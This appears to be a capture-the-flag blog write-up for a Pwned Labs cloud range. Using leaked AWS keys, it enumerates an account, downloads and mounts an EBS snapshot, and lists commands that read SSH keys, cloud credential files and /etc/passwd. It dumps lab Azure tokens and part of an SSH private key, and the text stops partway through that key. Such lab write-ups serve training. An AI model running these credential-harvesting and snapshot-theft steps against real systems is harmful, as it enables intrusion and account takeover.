---
description: Writeup for the 2nd flag (Pulled from the sky) in the Thunderdome Cyber Range from PwnedLabs
title: Pwned Labs - Thunderdome Flag 2 of 9
date: 2024-09-26 00:00:00 +0200
categories: [Cloud, Pwned Labs, Hacking]
tags: [cloud, hacking, pwnedlabs, thunderdome, aws, ec2, snapshots, pacu]
#show_image_post: true                                   # Change this to true
image: /assets/img/thunderdome.png              # Add infocard image here for post preview image

---
## Recap

Looking back on the previous flag we can summarize our findings below:

### User Info found from Bitbucket commits

```
User:haru@massive-pharma.com Password:Treatment!
User:nina@massive-pharma.com
```

### AWS Access Key leaked in Bitbucket

```
Access_key:AKIATCKANV3QK3BT3***
```

### Account ID obtained using the leaked access

```
AccountID:211125382880
```

### Buckets found from commits

```
mp-clinical-trial-data
```

If you would like to see how i obtained the above info, view the post for Flag 1 [here](https://mikecoetzee.github.io/posts/PwnedLabs-Thunderdome-Emerge-Through-The-Breach/) 

## Enumeration

Using the above info to log into Haru's AWS Account we retrieve the Access + Secret key of Haru in the AWS Secret Manager:

![aws](/assets/img/awskeypair.png)

`Access_Key:AKIATCKANV3QK3BT3***` & `Secret_Key:zCX7r3Ldc5WJMb2yo0D69ncAVARNpbFnmcZIT***`

We will be using a tool from Bishopfox called [Cloudfox](https://github.com/BishopFox/cloudfox) to gather some more information.
Lets start with configuring our aws keys onto a profile for Cloudfox to use.

```console
aws configure --profile haru
AWS Access Key ID [None]: AKIATCKANV3QK3BT3***
AWS Secret Access Key [None]: zCX7r3Ldc5WJMb2yo0D69ncAVARNpbFnmcZIT***
Default region name [None]:
Default output format [None]:
```

We can confirm the keys are working by running `aws sts get-caller-identity --profile haru` which should return below:

```json
{
    "UserId": "AIDATCKANV3QJQGCQM6FW",
    "Account": "211125382880",
    "Arn": "arn:aws:iam::211125382880:user/haru@massive-pharma.com"
}
```

Now that we have our aws profile configured lets run the Cloudfox tool with `cloudfox aws --profile haru all-checks`

![cloudfox](/assets/img/cloudfox.png)

After Cloudfox is finished doing most of the enumeration for us lets review the output which should be in `.cloudfox/cloudfox-output/aws/haru-211125382880`

Looking at the `Loot` directory we see the following results:

```console
-rw-r--r-- 1 Michael 197121   27 Sep 26 19:35 elastic-network-interfaces-PrivateIPs.txt
-rw-r--r-- 1 Michael 197121   29 Sep 26 19:35 elastic-network-interfaces-PublicIPs.txt
-rw-r--r-- 1 Michael 197121 1111 Sep 26 19:35 instances-ec2InstanceConnectCommands.txt
-rw-r--r-- 1 Michael 197121   27 Sep 26 19:35 instances-ec2PrivateIPs.txt
-rw-r--r-- 1 Michael 197121   29 Sep 26 19:35 instances-ec2PublicIPs.txt
-rw-r--r-- 1 Michael 197121 2073 Sep 26 19:35 instances-ssmCommands.txt
-rw-r--r-- 1 Michael 197121  787 Sep 26 19:35 inventory.txt
-rw-r--r-- 1 Michael 197121  329 Sep 26 19:35 network-ports-private-ipv4.txt
-rw-r--r-- 1 Michael 197121  331 Sep 26 19:35 network-ports-public-ipv4.txt
-rw-r--r-- 1 Michael 197121  529 Sep 26 19:35 pull-secrets-commands.txt
```

Looking at the `inventory.txt` file we get some additional info to work with:

```console
arn:aws:iam::211125382880:user/detective-user
arn:aws:iam::211125382880:user/haru@massive-pharma.com
arn:aws:iam::211125382880:user/nacer@massive-pharma.com
arn:aws:iam::211125382880:user/nina@massive-pharma.com
arn:aws:iam::211125382880:user/sven@massive-pharma.com
arn:aws:ec2:us-east-1:211125382880:image/ami-00568b27b974ba617
arn:aws:ec2:us-east-1:211125382880:snapshot/snap-0c241b0d00d234853
arn:aws:ec2:us-east-1:211125382880:volume/vol-05ada6051c8801cad
arn:aws:ec2:us-east-1:211125382880:volume/vol-06ca35e92e87b4aac
arn:aws:ec2:us-east-1:211125382880:instance/i-0874ad63d9693239c
arn:aws:ec2:us-east-1:211125382880:instance/i-0d67cb27d5cc12605
arn:aws:secretsmanager:us-east-1:211125382880:secret:flag-6LBCtw
arn:aws:secretsmanager:us-east-1:211125382880:secret:aws/haru-yQP4Jm
```

We find more users to add to our list:

```
detective-user
nacer@massive-pharma.com
sven@massive-pharma.com
```

Looking into the AMI image there is not much we can do there along with the instances. The secrets we have already utilized. Which leaves us with the Snapshot.
Lets look more into `arn:aws:ec2:us-east-1:211125382880:snapshot/snap-0c241b0d00d234853`

## Abusing Snapshot to gain additional information

Reading up on the documentation on aws [here](https://docs.aws.amazon.com/cli/latest/reference/ec2/describe-snapshots.html) we can run the command `aws ec2 describe-snapshots --snapshot-ids snap-0c241b0d00d234853 --profile haru`

Which returns more info on the snapshot:

```json
{
    "Snapshots": [
        {
            "Description": "Created by CreateImage(i-0d67cb27d5cc12605) for ami-00568b27b974ba617",
            "Encrypted": false,
            "OwnerId": "211125382880",
            "Progress": "100%",
            "SnapshotId": "snap-0c241b0d00d234853",
            "StartTime": "2024-03-08T14:21:24.988000+00:00",
            "State": "completed",
            "VolumeId": "vol-05ada6051c8801cad",
            "VolumeSize": 8,
            "StorageTier": "standard"
        }
    ]
}
```

There are a few tools we can use to pull the snapshot to our local machine. I will be using a tool from Rhino Security Labs called [Pacu](https://github.com/RhinoSecurityLabs/pacu)

Using Kali linux we can simply run `apt install pacu` to install the tool as it's already in the Kali repo. 

Lets fire up the tool with the command `pacu` and create a new session and name it `thunderdome` and import our AWS keys for our haru profile with `import_keys haru`

Now we are ready to download the snapshot with the `ebs__download_snapshots` module with the below command. 

```console
Pacu (thunderdome:imported-haru) > run ebs__download_snapshots --snapshot-id snap-0c241b0d00d234853 --region us-east-1
```

After the download finished (there were some errors in the cli) i had some issues with the image and decided to try [dsnap](https://github.com/RhinoSecurityLabs/dsnap.git) which is the module that the `pacu` tool makes use of. Very important to have multiple tools to sometimes do a sanity check.. 

```console
git clone https://github.com/RhinoSecurityLabs/dsnap.git
cd dsnap
```
Seems we can not pass a profile so we need to setup our aws keys for the default profile to use `dsnap`

```console
──(kali㉿kali)-[~/…/Thunderdome flag2/downloads/ebs/snapshots]
└─$ aws configure

AWS Access Key ID [****************3CVG]:
AWS Secret Access Key [None]: zCX7r3Ldc5WJMb2yo0D69ncAVARNpbFnmcZIT***
Default region name [None]:
Default output format [None]:
```

Now we can list the snapshots with `dsnap list`

```console
┌──(kali㉿kali)-[~/…/Thunderdome flag2/downloads/ebs/snapshots]
└─$ dsnap list

Id          |   Owneer ID   | Description

snap-0c241b0d00d234853   211125382880   Created by CreateImage(i-0d67cb27d5cc12605) for ami-00568b27b974ba617
```

We can download the snapshot with `dsnap get snap-0c241b0d00d234853`

```console
┌──(kali㉿kali)-[~/…/Thunderdome flag2/downloads/ebs/snapshots]
└─$ dsnap get snap-0c241b0d00d234853
Selected snapshot with id snap-0c241b0d00d234853
Output Path: /home/kali/.local/share/pacu/Thunderdome flag2/downloads/ebs/snapshots/snap-0c241b0d00d234853.img
Truncating file to 8.0 GB
```

### Mounting the image

Now we need to mount the image, there are a few ways but I will be using docker as it seems a bit more straight forward. 
Follow the steps from [RhinoSecurityLabs](https://github.com/RhinoSecurityLabs/dsnap?tab=readme-ov-file#mounting-with-docker) to mount the image to be able to browse the content. 

Installing Docker

```console
sudo apt install -y docker.io
sudo systemctl enable docker
```

Building the dsnap container

```console
git clone https://github.com/RhinoSecurityLabs/dsnap.git
cd dsnap
make docker/build
```

Now we can mount the image

```console
┌──(kali㉿kali)-[/opt/dsnap]
└─$ sudo docker run -it -v "/home/kali/.local/share/pacu/Thunderdome flag2/downloads/ebs/snapshots/snap-0c241b0d00d234853.img:/disks/snap-0c241b0d00d234853.img" -w /disks dsnap-mount --ro -a "snap-0c241b0d00d234853.img" -m /dev/sda1:/

Welcome to guestfish, the guest filesystem shell for
editing virtual machine filesystems and disk images.

Type: ‘help’ for help on commands
‘man’ to read the manual
‘quit’ to quit the shell

> <fs>
```

And we have access to the local contents of the snapshot with guestfish! Lets look for some info that we can use to pivot from.

### Snapshot Enumeration

List of usual places to look for sensitive info:

```
ls /root
ls /root/.ssh
cat /root/.ssh/id_rsa
cat /root/.ssh/authorized_keys
ls /home
ls /home/<user>/.aws
cat /home/<user>/.aws/credentials
ls /home/<user>/.azure
ls /home/<user>/.config/gcloud/
cat /home/<user>/.config/gcloud/credentials.db
cat /home/<user>/.ssh/id_rsa
cat /home/<user>/.ssh/authorized_keys
cat /home/<user>/.ssh/known_hosts
cat /etc/environment
cat /home/<user>/.bash_history
cat /etc/passwd
cat /etc/group
cat /etc/crontab
ls /var/log
ls /var/spool/cron/crontabs
cat /etc/hosts
```

And right away we get some sensitive info to work with. Lets work through the list and note everything down. 

We have multiple user directories

```
<fs> ls /home
haru
nacer
ubuntu
<fs>
```

Looking at Haru and Ubuntu there is nothing that stands out but Nacer makes up for that in full.. 

Nacer AWS keys!

```
<fs> cat /home/nacer/.aws/credentials
[default]
aws_access_key_id = AKIATCKANV3QAD7S2***
aws_secret_access_key = GqWJEq7oRKCeNy+qbCBD5rh6Ho2V+YaXoPB4Y***
```

Nacer Azure tokens! (Possible Azure Pivot with Tenant info)


```console
<fs> cat /home/nacer/.azure/msal_token_cache.json
{
"AccessToken": {
"96a23c02-8a87-4b9d-9903-296a8cf057e9.2522da8b-d801-40c4-88bf-1944eae9d237-login.microsoftonline.com-accesstoken-04b07795-8ddb-461a-bbee-02f9e1bf7b46-organizations-https://management.core.windows.net//user_impersonation https://management.core.windows.net//.default": {
"credential_type": "AccessToken",
"secret": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlhSdmtvOFA3QTNVYVdTblU3Yk05blQwTWpoQSIsImtpZCI6IlhSdmtvOFA3QTNVYVdTblU3Yk05blQwTWpoQSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuY29yZS53aW5kb3dzLm5ldC8iLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8yNTIyZGE4Yi1kODAxLTQwYzQtODhiZi0xOTQ0ZWFlOWQyMzcvIiwiaWF0IjoxNzA5OTA2MTAzLCJuYmYiOjE3MDk5MDYxMDMsImV4cCI6MTcwOTkxMDY4NSwiYWNyIjoiMSIsImFpbyI6IkFUUUF5LzhXQUFBQXBmRUNIOXVkeHp0NTlJMjZWUi85Z29DRTR0M0Z4d0lwbjlwZE9HT0ZIRk51YjNTYVpXSzFocEZWeTV0UVArWlYiLCJhbXIiOlsicHdkIl0sImFwcGlkIjoiMDRiMDc3OTUtOGRkYi00NjFhLWJiZWUtMDJmOWUxYmY3YjQ2IiwiYXBwaWRhY3IiOiIwIiwiZ3JvdXBzIjpbIjg3N2JkMWRmLTE3NDAtNGRhOC05MGMxLTAxMTdlYjU0Yjg3YyJdLCJpZHR5cCI6InVzZXIiLCJpcGFkZHIiOiI0NC4yMDguMjI4Ljk0IiwibmFtZSI6Ik5hY2VyIEJhcmF6aXRlIiwib2lkIjoiOTZhMjNjMDItOGE4Ny00YjlkLTk5MDMtMjk2YThjZjA1N2U5IiwicHVpZCI6IjEwMDMyMDAzNDlFOThBNjQiLCJyaCI6IjAuQWE0QWk5b2lKUUhZeEVDSXZ4bEU2dW5TTjBaSWYza0F1dGRQdWtQYXdmajJNQk9yQUhNLiIsInNjcCI6InVzZXJfaW1wZXJzb25hdGlvbiIsInN1YiI6ImMtd1BpeWQyM3RqU0YtejZwdkRZdHZhNDNBMmVaUDhnd3R6bHNtNnRMek0iLCJ0aWQiOiIyNTIyZGE4Yi1kODAxLTQwYzQtODhiZi0xOTQ0ZWFlOWQyMzciLCJ1bmlxdWVfbmFtZSI6Im5hY2VyQG1hc3NpdmUtcGhhcm1hLmNvbSIsInVwbiI6Im5hY2VyQG1hc3NpdmUtcGhhcm1hLmNvbSIsInV0aSI6IjJIX1U5cUlpLUUtbV9uR3QxSHAxQUEiLCJ2ZXIiOiIxLjAiLCJ3aWRzIjpbIjg4ZDhlM2UzLThmNTUtNGExZS05NTNhLTliOTg5OGI4ODc2YiIsImI3OWZiZjRkLTNlZjktNDY4OS04MTQzLTc2YjE5NGU4NTUwOSJdLCJ4bXNfY2FlIjoiMSIsInhtc19jYyI6WyJDUDEiXSwieG1zX2ZpbHRlcl9pbmRleCI6WyIxNzQiXSwieG1zX3JkIjoiMC40MkxqWUJSaVdzY0lBQSIsInhtc19zc20iOiIxIiwieG1zX3RjZHQiOjE3MDYzNzc0Njd9.HBNMlkGg7gkJ41lbzT16bQeytn8_jpEYNfDr3U7tUbxWoXi551eWztx6mAFKIoBFWH9izM_hQeiZErctEI_EP6RePgZ3A5z7VvnnooPHdLKYfbI-Wl6NCLJtkEFbIFE3Xvq8yu7BwWytxulX5iNa7f28yHurtLkP5wT601G1RFsDonHtdYpeFjohp7nat16Q7I3Kz5Xf_6KvD-xU3WJICM9K7MMtXbMVNPHhPGEFaYn7Y0a920E0IbXwDRP_6BLR-BEnb7SvvRcuRAGkJhvXNHwrL7wdc1cIIA9WrEN60Z6VA0mg4n1dSM7iuy77FGwHkd3oJhNge9T9G_IMFaUPxA",
"home_account_id": "96a23c02-8a87-4b9d-9903-296a8cf057e9.2522da8b-d801-40c4-88bf-1944eae9d237",
"environment": "login.microsoftonline.com",
"client_id": "04b07795-8ddb-461a-bbee-02f9e1bf7b46",
"target": "https://management.core.windows.net//user_impersonation https://management.core.windows.net//.default",
"realm": "organizations",
"token_type": "Bearer",
"cached_at": "1709906403",
"expires_on": "1709910684",
"extended_expires_on": "1709910684"
},
"96a23c02-8a87-4b9d-9903-296a8cf057e9.2522da8b-d801-40c4-88bf-1944eae9d237-login.microsoftonline.com-accesstoken-04b07795-8ddb-461a-bbee-02f9e1bf7b46-2522da8b-d801-40c4-88bf-1944eae9d237-https://management.core.windows.net//user_impersonation https://management.core.windows.net//.default": {
"credential_type": "AccessToken",
"secret": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlhSdmtvOFA3QTNVYVdTblU3Yk05blQwTWpoQSIsImtpZCI6IlhSdmtvOFA3QTNVYVdTblU3Yk05blQwTWpoQSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuY29yZS53aW5kb3dzLm5ldC8iLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8yNTIyZGE4Yi1kODAxLTQwYzQtODhiZi0xOTQ0ZWFlOWQyMzcvIiwiaWF0IjoxNzA5OTA2MTA0LCJuYmYiOjE3MDk5MDYxMDQsImV4cCI6MTcwOTkxMTY3NywiYWNyIjoiMSIsImFpbyI6IkFUUUF5LzhXQUFBQW1LQzc2dFR2MHE0RGJNS3ptUTZobmpsZ2FCQndyRG1iaHFZWmxkdi9kSUFDamZMRDEwYWttRjZHZVY2UnFVMnkiLCJhbXIiOlsicHdkIl0sImFwcGlkIjoiMDRiMDc3OTUtOGRkYi00NjFhLWJiZWUtMDJmOWUxYmY3YjQ2IiwiYXBwaWRhY3IiOiIwIiwiZ3JvdXBzIjpbIjg3N2JkMWRmLTE3NDAtNGRhOC05MGMxLTAxMTdlYjU0Yjg3YyJdLCJpZHR5cCI6InVzZXIiLCJpcGFkZHIiOiI0NC4yMDguMjI4Ljk0IiwibmFtZSI6Ik5hY2VyIEJhcmF6aXRlIiwib2lkIjoiOTZhMjNjMDItOGE4Ny00YjlkLTk5MDMtMjk2YThjZjA1N2U5IiwicHVpZCI6IjEwMDMyMDAzNDlFOThBNjQiLCJyaCI6IjAuQWE0QWk5b2lKUUhZeEVDSXZ4bEU2dW5TTjBaSWYza0F1dGRQdWtQYXdmajJNQk9yQUhNLiIsInNjcCI6InVzZXJfaW1wZXJzb25hdGlvbiIsInN1YiI6ImMtd1BpeWQyM3RqU0YtejZwdkRZdHZhNDNBMmVaUDhnd3R6bHNtNnRMek0iLCJ0aWQiOiIyNTIyZGE4Yi1kODAxLTQwYzQtODhiZi0xOTQ0ZWFlOWQyMzciLCJ1bmlxdWVfbmFtZSI6Im5hY2VyQG1hc3NpdmUtcGhhcm1hLmNvbSIsInVwbiI6Im5hY2VyQG1hc3NpdmUtcGhhcm1hLmNvbSIsInV0aSI6IklhTXZWVFpWcjBPWUhEczJZMDlxQUEiLCJ2ZXIiOiIxLjAiLCJ3aWRzIjpbIjg4ZDhlM2UzLThmNTUtNGExZS05NTNhLTliOTg5OGI4ODc2YiIsImI3OWZiZjRkLTNlZjktNDY4OS04MTQzLTc2YjE5NGU4NTUwOSJdLCJ4bXNfY2FlIjoiMSIsInhtc19jYyI6WyJDUDEiXSwieG1zX2ZpbHRlcl9pbmRleCI6WyIxNzQiXSwieG1zX3JkIjoiMC40MkxqWUJSaVdzY0lBQSIsInhtc19zc20iOiIxIiwieG1zX3RjZHQiOjE3MDYzNzc0Njd9.G_1Zep8BZLGXfgin-gmsOzfpqAFwsUGpt2flZzywGWmM9Cyf0EfTaAdqTpJlcz8YVMe6njWR66DD62hsnYH7OIOt_BwNr9dZubsQyZJh8mKKRH7WVJ9e17hhhtzxJzGjpBc2xLpSRO4RpvJTrxCtkUsHvjoV_tj1mwFCoJXNU8gypyuhFVoMiZZSD0m-lMMcHOY88pBRKnbEzjDvbko8PKeJ4XRrPsJ6zx2pr2EXIx5Pnu5k7NWl8nl58XOvvoSLUXWdLC3Xyw-zNq02rz8f9AdZvgWKrs44-4LCuAaqdunzWZRbosSOBz1F3l6g8XDFgXAS5bzpkB0tHr6IJ07KLg",
"home_account_id": "96a23c02-8a87-4b9d-9903-296a8cf057e9.2522da8b-d801-40c4-88bf-1944eae9d237",
"environment": "login.microsoftonline.com",
"client_id": "04b07795-8ddb-461a-bbee-02f9e1bf7b46",
"target": "https://management.core.windows.net//user_impersonation https://management.core.windows.net//.default",
"realm": "2522da8b-d801-40c4-88bf-1944eae9d237",
"token_type": "Bearer",
"cached_at": "1709906405",
"expires_on": "1709911677",
"extended_expires_on": "1709911677"
}
},
"Account": {
"96a23c02-8a87-4b9d-9903-296a8cf057e9.2522da8b-d801-40c4-88bf-1944eae9d237-login.microsoftonline.com-organizations": {
"home_account_id": "96a23c02-8a87-4b9d-9903-296a8cf057e9.2522da8b-d801-40c4-88bf-1944eae9d237",
"environment": "login.microsoftonline.com",
"realm": "organizations",
"local_account_id": "96a23c02-8a87-4b9d-9903-296a8cf057e9",
"username": "nacer@massive-pharma.com",
"authority_type": "MSSTS"
}
},
"IdToken": {
"96a23c02-8a87-4b9d-9903-296a8cf057e9.2522da8b-d801-40c4-88bf-1944eae9d237-login.microsoftonline.com-idtoken-04b07795-8ddb-461a-bbee-02f9e1bf7b46-organizations-": {
"credential_type": "IdToken",
"secret": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlhSdmtvOFA3QTNVYVdTblU3Yk05blQwTWpoQSJ9.eyJhdWQiOiIwNGIwNzc5NS04ZGRiLTQ2MWEtYmJlZS0wMmY5ZTFiZjdiNDYiLCJpc3MiOiJodHRwczovL2xvZ2luLm1pY3Jvc29mdG9ubGluZS5jb20vMjUyMmRhOGItZDgwMS00MGM0LTg4YmYtMTk0NGVhZTlkMjM3L3YyLjAiLCJpYXQiOjE3MDk5MDYxMDMsIm5iZiI6MTcwOTkwNjEwMywiZXhwIjoxNzA5OTEwMDAzLCJhaW8iOiJBVFFBeS84V0FBQUFnL2NGQkRGSERyZjZTcDFDenpkQWN1ekpsYzJUTUg4YTdTRDNabElwNHJ2eGltWGVRMlM3amxuRlU2Qy9VQmFwIiwibmFtZSI6Ik5hY2VyIEJhcmF6aXRlIiwib2lkIjoiOTZhMjNjMDItOGE4Ny00YjlkLTk5MDMtMjk2YThjZjA1N2U5IiwicHJlZmVycmVkX3VzZXJuYW1lIjoibmFjZXJAbWFzc2l2ZS1waGFybWEuY29tIiwicHVpZCI6IjEwMDMyMDAzNDlFOThBNjQiLCJyaCI6IjAuQWE0QWk5b2lKUUhZeEVDSXZ4bEU2dW5TTjVWM3NBVGJqUnBHdS00Qy1lR19lMGFyQUhNLiIsInN1YiI6IkxxbDJsQnJ3OEtGZmZkYXQ0bHNSWFpESnRZd05EMV82VlZhTFdQZ1JfaE0iLCJ0aWQiOiIyNTIyZGE4Yi1kODAxLTQwYzQtODhiZi0xOTQ0ZWFlOWQyMzciLCJ1dGkiOiIySF9VOXFJaS1FLW1fbkd0MUhwMUFBIiwidmVyIjoiMi4wIn0.hh-vAPZRfFwGR3CXw3xXdTJTjnKUc0QYpkqFGWFHR5s0f04axalYWfHeSeeMtczVEW1tpwFwvOOKp9CKmzxGqYpfJMBdXu1o5Wh-4yw1IqJqK_4UXzdNgT_QD4JLYeb0Cp0UgFkm09kkRy1mBTdxgpGvZxFq9DsF-QJT0-ufRE6QafKZFmyF1gPjFcJtKBhcGHBQtSNSuIWLT6CLhYLQVsuST1frzBx83KlQnQJAGDZgAjC0kOTSFfTzZQlv4Fp9ktPqO8kmv-WnU6H2qkpPj8w1QqrhTP8yYJ552hyafA0Vq_uSQb9Cd7rlYy5uW6c9LOnkbNwevEVCS7DXh0XGKA",
"home_account_id": "96a23c02-8a87-4b9d-9903-296a8cf057e9.2522da8b-d801-40c4-88bf-1944eae9d237",
"environment": "login.microsoftonline.com",
"realm": "organizations",
"client_id": "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
},
"96a23c02-8a87-4b9d-9903-296a8cf057e9.2522da8b-d801-40c4-88bf-1944eae9d237-login.microsoftonline.com-idtoken-04b07795-8ddb-461a-bbee-02f9e1bf7b46-2522da8b-d801-40c4-88bf-1944eae9d237-": {
"credential_type": "IdToken",
"secret": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlhSdmtvOFA3QTNVYVdTblU3Yk05blQwTWpoQSJ9.eyJhdWQiOiIwNGIwNzc5NS04ZGRiLTQ2MWEtYmJlZS0wMmY5ZTFiZjdiNDYiLCJpc3MiOiJodHRwczovL2xvZ2luLm1pY3Jvc29mdG9ubGluZS5jb20vMjUyMmRhOGItZDgwMS00MGM0LTg4YmYtMTk0NGVhZTlkMjM3L3YyLjAiLCJpYXQiOjE3MDk5MDYxMDQsIm5iZiI6MTcwOTkwNjEwNCwiZXhwIjoxNzA5OTEwMDA0LCJhaW8iOiJBVFFBeS84V0FBQUF0ZjR1dGQwZkRFdFlmNEhOT0xFN3hrd0hHNUZFdHZVUTZLck50UFNZT2FxdyswZGZ3OGdWVW5OL0Z1eHY4bWx4IiwibmFtZSI6Ik5hY2VyIEJhcmF6aXRlIiwib2lkIjoiOTZhMjNjMDItOGE4Ny00YjlkLTk5MDMtMjk2YThjZjA1N2U5IiwicHJlZmVycmVkX3VzZXJuYW1lIjoibmFjZXJAbWFzc2l2ZS1waGFybWEuY29tIiwicHVpZCI6IjEwMDMyMDAzNDlFOThBNjQiLCJyaCI6IjAuQWE0QWk5b2lKUUhZeEVDSXZ4bEU2dW5TTjVWM3NBVGJqUnBHdS00Qy1lR19lMGFyQUhNLiIsInN1YiI6IkxxbDJsQnJ3OEtGZmZkYXQ0bHNSWFpESnRZd05EMV82VlZhTFdQZ1JfaE0iLCJ0aWQiOiIyNTIyZGE4Yi1kODAxLTQwYzQtODhiZi0xOTQ0ZWFlOWQyMzciLCJ1dGkiOiJJYU12VlRaVnIwT1lIRHMyWTA5cUFBIiwidmVyIjoiMi4wIn0.IKnrkw1pNiql9fT4hjfwpDx-JVFeO91b3IUP1FNNtChP76u6t75FRhEWinlKyBzJy9gpSXHq9-yK5mhEhl2s8c1Igxb7vv-isLmjYquAAX6lCTH4QAYAijKdUstdd5z_e0tOTA2qANoAV0fGo8nc4wTCP2p36gIgaXxkM5-bSXHkocIE6B3AbHxbP85ptOyzisdOD_IEJr7YjX3Fc-XaVErF97ozD34CpC-eFmTFIZHr9Dco0dHU2qvQxXL44NDwFVgL0jxDB-TQIDj9xUs2uZcWOXVhNRJqv07hMnkCaRBMQ9vzebnb4iPyp6CpInIpI9z8m7kjg2OROSW5DFai-w",
"home_account_id": "96a23c02-8a87-4b9d-9903-296a8cf057e9.2522da8b-d801-40c4-88bf-1944eae9d237",
"environment": "login.microsoftonline.com",
"realm": "2522da8b-d801-40c4-88bf-1944eae9d237",
"client_id": "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
}
},
"RefreshToken": {
"96a23c02-8a87-4b9d-9903-296a8cf057e9.2522da8b-d801-40c4-88bf-1944eae9d237-login.microsoftonline.com-refreshtoken-04b07795-8ddb-461a-bbee-02f9e1bf7b46--https://management.core.windows.net//user_impersonation https://management.core.windows.net//.default": {
"credential_type": "RefreshToken",
"secret": "0.Aa4Ai9oiJQHYxECIvxlE6unSN5V3sATbjRpGu-4C-eG_e0arAHM.AgABAAEAAADnfolhJpSnRYB1SVj-Hgd8AgDs_wUA9P80D9whslr76-qn3KXbz92z7PYV09JNRNbzWbqto_PI_UMQGpa_uwjtJl-XugFPi3lAHGXwbhZb7oAW8x-2J7hQUc9mKTypJuPRNc7vK_sLWh5kDa5cs8UFA_iyDxL_DOzb6W_d11tf_zM3O_1KQpDQ2_eZJ3ugWrquMv6k4mCkPhkVB_JBBpvspCQGxiXl7uCzXeSHJwV6sFABrTcH7CSTbdJRLsafoIaUCM7o-H9gk-TDkSwsG9yR1qxY6Zq2EyZukFkeR007Kr3FUz9grWU_Qapu-BNOAwC4pILiRVoRIQo-cnUuiggxzqukO5P7tkMr0GF7WwBOh7igFKiQOG9uQBtigQJ2HY5Vup5bCo3-Zp6w0fZougDv66od94Yvyx3gzyLD6Hkif0OQIRFa67lNiZrFZ2dYVRmIJo6ws3f7iP83GOoqHUSrxqk2SsDzfveRi-sFZepVIUIIqldFQEy5aiQyPIZ7N7FP_pC-plzOG0ORo__SjKDpYd14l-RJN0W309F4YVUkrYgvrDsRGlI5g5_1Ku1b532jUC8VCx1kfilyZHZeZOOFNMN0tw_C6RqXvCag8zoe8pD2FmXpAVm2mldhU9i8_bsbxsfyF8mixf5v7VZ4kDnNpEEKBN5NTVmI8mNwFCMXJqYFtrMonDEugDpspGth96kc3iOYO-W24uX0EjEcQsRwX2TnXw",
"home_account_id": "96a23c02-8a87-4b9d-9903-296a8cf057e9.2522da8b-d801-40c4-88bf-1944eae9d237",
"environment": "login.microsoftonline.com",
"client_id": "04b07795-8ddb-461a-bbee-02f9e1bf7b46",
"target": "https://management.core.windows.net//user_impersonation https://management.core.windows.net//.default",
"last_modification_time": "1709906405",
"family_id": "1"
}
},
"AppMetadata": {
"appmetadata-login.microsoftonline.com-04b07795-8ddb-461a-bbee-02f9e1bf7b46": {
"client_id": "04b07795-8ddb-461a-bbee-02f9e1bf7b46",
"environment": "login.microsoftonline.com",
"family_id": "1"
}
}
}
```

Nacer SSH key! We might be able to use this to log into the live VM.

```console
<fs> cat /home/nacer/.ssh/id_rsa
 
 
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
 NhAAAAAwEAAQAAAYEAsokZUfozTwTvXZS5WvNIolkGGnqWw64my9xVnBVOxOLPlu5tszpa
 iZJN5Vg7Vgs7fLAxuUG61T7F+xllM7TnD/bXzguPRMAdp3JL1TUClK/NWznrJomovx+4hf
 r1zRNGtQw6PbQepkzMZP3b1CDEgT4KXTuq/K/pB196gyntlGIBSP8JKJOGt+5L0EE1Jc64
 Rl9W15T+ypUUE+w2E1JVIxgOGFTu2nHCoRkyQmx8ekDobCx5N1yqcOJNMXeSXVl0Dl78h/
 2QmEjg+HNFupesNVfbWEX9cq1IMgom1m+mUTU5XjEjchEgmzBf0GMQF0Ae8wDDU7XC0smS
 MVgcJAO3NDgT4G+a8HP6J4RFSSKjnlNNH9YasFkTH1X4zxnnsOhMFHMmWfRTb79NnekAPc
 mvqQPrXfUx+UEmQsYnqfCYa4eJ0QH1woNORGtA/7KbYNhhHHE1gFq5xT3U32Ra7mAmn8e2
 tfq+UkiX3CgfOsTzmmMswSWHeCasmtqMTJ7nk7j5AAAFkFiu035YrtN+AAAAB3NzaC1yc2
 EAAAGBALKJGVH6M08E712UuVrzSKJZBhp6lsOuJsvcVZwVTsTiz5bubbM6WomSTeVYO1YL
 O3ywMblButU+xfsZZTO05w/2184Lj0TAHadyS9U1ApSvzVs56yaJqL8fuIX69c0TRrUMOj
 20HqZMzGT929QgxIE+Cl07qvyv6QdfeoMp7ZRiAUj/CSiThrfuS9BBNSXOuEZfVteU/sqV
 FBPsNhNSVSMYDhhU7tpxwqEZMkJsfHpA6GwseTdcqnDiTTF3kl1ZdA5e/If9kJhI4PhzRb
 qXrDVX21hF/XKtSDIKJtZvplE1OV4xI3IRIJswX9BjEBdAHvMAw1O1wtLJkjFYHCQDtzQ4
 E+BvmvBz+ieERUkio55TTR/WGrBZEx9V+M8Z57DoTBRzJln0U2+/TZ3pAD3Jr6kD6131Mf
 lBJkLGJ6nwmGuHidEB9cKDTkRrQP+ym2DYYRxxNYBaucU91N9kWu5gJp/HtrX6vlJIl9wo
 HzrE85pjLMElh3gmrJrajEye55O4+QAAAAMBAAEAAAGAAPYuFbv0RMuxAl8HtI606HL0Tn
 Y0k68/dD+mkmWm+/aAyb5VBu8ch7srAj48a5U5580HJ4lMGVPyOw0C94lU6UgaF3kGd4dV
 YY6DDA3yCpz7zS79rkJ1jzn7g3U7l7Qv4E/FjImI1Lp7K1wWsAjRJiUQZzooDJ5h8fE4tr
 YmGnOAsET3ZqmMwzbcX63KPH7ljTN8Q0MBMFQnPIg8LlR2Mu8xPD5Q3wpX0whQtfzhmsL4
 vYRrzrmIDX2ajtanCiuuKwuk9TqFPkEIhlJHDRQNG2jQ+qf/G31JpXFG2vX6MVcInfqjsz
 Ova6qUQ8mNyh7AMQXtT7EbXD3gIrYXxDgxMrfGpiM4Y2VgRZBfxpRGRlaDubAlqchui9Fz
